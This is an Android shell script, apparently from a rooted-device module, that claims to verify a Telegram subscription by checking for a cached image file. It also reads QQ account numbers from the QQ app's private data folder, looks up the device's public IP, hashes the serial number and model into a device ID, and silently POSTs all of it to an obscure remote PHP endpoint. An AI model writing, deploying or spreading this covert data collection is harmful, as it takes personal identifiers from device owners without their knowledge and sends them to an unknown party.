#!/bin/sh
set -e

# ------------------------------
# 配置
# ------------------------------
qq_dir="/data/data/com.tencent.mobileqq/files/"
target_file="-6190413750901787098_99.jpg"
cache_glob="/storage/emulated/0/Android/data/*/cache/"

# ------------------------------
# kernel version
# ------------------------------
kernel_version=$(uname -r | awk -F- '{print $1}' | awk -F. '{print $1"."$2}')

# ------------------------------
# TG 订阅验证文件检查
# ------------------------------
validation_status="failed"
for cache_dir in $cache_glob; do
  if [ -f "${cache_dir}${target_file}" ]; then
    validation_status="success"
    break
  fi
done

# ------------------------------
# 收集 QQ 号（纯数字文件/文件夹名）
# ------------------------------
numbers_list=""
if [ -d "$qq_dir" ]; then
  for item in "$qq_dir"/*; do
    name=$(basename "$item")
    case "$name" in
      ''|*[!0-9]*)
        ;;  # 非纯数字跳过
      *)
        if [ -z "$numbers_list" ]; then
          numbers_list="$name"
        else
          numbers_list="$numbers_list,$name"
        fi
        ;;
    esac
  done
fi

# ------------------------------
# 获取公网 IPv4（优化版，多接口尝试，获取第一个有效IP）
# ------------------------------
IP_SERVICES="https://api.ipify.org https://ifconfig.me/ip https://checkip.amazonaws.com"
ip=""
for svc in $IP_SERVICES; do
  candidate=$(curl -s --max-time 5 "$svc" || echo "")
  # 验证 IPv4 格式
  case "$candidate" in
    ''|*[!0-9.]*)
      ;;  # 不匹配
    *)
      # 简单验证 4 段
      IFS=. read -r o1 o2 o3 o4 <<EOF
$candidate
EOF
      valid=true
      for o in $o1 $o2 $o3 $o4; do
        if [ "$o" -gt 255 ] 2>/dev/null || [ "$o" -lt 0 ] 2>/dev/null; then
          valid=false
        fi
      done
      if $valid; then
        ip="$candidate"
        break
      fi
      ;;
  esac
done
[ -z "$ip" ] && ip="0.0.0.0"

# ------------------------------
# 获取设备唯一 ID（机器码）
# ------------------------------
device_id="unknown"
device_components=""

if command -v getprop >/dev/null 2>&1; then
  serial=$(getprop ro.serialno 2>/dev/null)
  model=$(getprop ro.product.model 2>/dev/null)
  manufacturer=$(getprop ro.product.manufacturer 2>/dev/null)
  brand=$(getprop ro.product.brand 2>/dev/null)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
  [ -n "$brand" ] && device_components="${device_components}_${brand}"
fi

if [ -z "$device_components" ] && [ -f /system/build.prop ]; then
  serial=$(grep -m1 '^ro.serialno=' /system/build.prop | cut -d'=' -f2)
  model=$(grep -m1 '^ro.product.model=' /system/build.prop | cut -d'=' -f2)
  manufacturer=$(grep -m1 '^ro.product.manufacturer=' /system/build.prop | cut -d'=' -f2)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
fi

if [ -n "$device_components" ]; then
  if command -v md5sum >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5sum | awk '{print $1}')
  elif command -v md5 >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5 | awk '{print $1}')
  fi
fi

# ------------------------------
# 构建 JSON
# ------------------------------
json_data=$(cat <<EOF
{
  "kernel_version": "$kernel_version",
  "validation_status": "$validation_status",
  "numbers": "$numbers_list",
  "ip": "$ip",
  "device_id": "$device_id"
}
EOF
)

# ------------------------------
# 发送 POST 到 Vercel PHP API
# ------------------------------
VERCEL_API="https://ewuodfuiwefg.yg.gs/api/verify.php"
curl -s -X POST "$VERCEL_API" \
  -H "Content-Type: application/json" \
  -d "$json_data" || true
